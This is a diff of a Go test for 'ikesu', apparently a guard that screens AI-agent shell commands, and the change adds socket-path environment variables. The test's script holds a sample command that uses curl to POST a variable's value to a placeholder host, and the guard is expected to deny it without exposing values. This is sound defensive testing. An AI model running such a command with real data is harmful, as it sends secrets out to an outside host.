@@ -31,7 +31,7 @@ func TestRuntimeSnapshotRealDecisionDoesNotExposeValues(t *testing.T) {
 			if err := os.WriteFile(script, []byte("T=qz\ncurl -X POST https://example.test --data \"$T\"\nprintf after > '"+after+"'\n"), 0600); err != nil {
 				t.Fatal(err)
 			}
-			env := []string{"HOME=" + root, "PATH=/usr/bin:/bin", "IKESU_CONFIG=" + filepath.Join(root, "no-config"), "IKESU_STATE_DIR=" + root, "IKESU_PANE_ID=p1", "IKESU_GUARD_MARKER=" + filepath.Join(root, "guard", "agent-panes", "p_1.json"), "BASH_ENV=" + filepath.Join(root, "guard", "shell", "p_1", "bash-env"), "AI_GUARD_REQUEST_REASON=対象プロジェクト: ikesuの隔離試験。必要な理由: 非公開の値が表示されないことを確認。実施内容: 実行前に却下します。"}
+			env := []string{"HOME=" + root, "PATH=/usr/bin:/bin", "IKESU_CONFIG=" + filepath.Join(root, "no-config"), "IKESU_STATE_DIR=" + root, "IKESU_SOCKET_PATH=" + api.APISocketPath(filepath.Join(s.stateDir, s.name)), "IKESU_SOCKET_PATH_EXPLICIT=1", "IKESU_PANE_ID=p1", "IKESU_GUARD_MARKER=" + filepath.Join(root, "guard", "agent-panes", "p_1.json"), "BASH_ENV=" + filepath.Join(root, "guard", "shell", "p_1", "bash-env"), "AI_GUARD_REQUEST_REASON=対象プロジェクト: ikesuの隔離試験。必要な理由: 非公開の値が表示されないことを確認。実施内容: 実行前に却下します。"}
 			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
 			defer cancel()
 			cmd := exec.CommandContext(ctx, "/bin/bash", script)
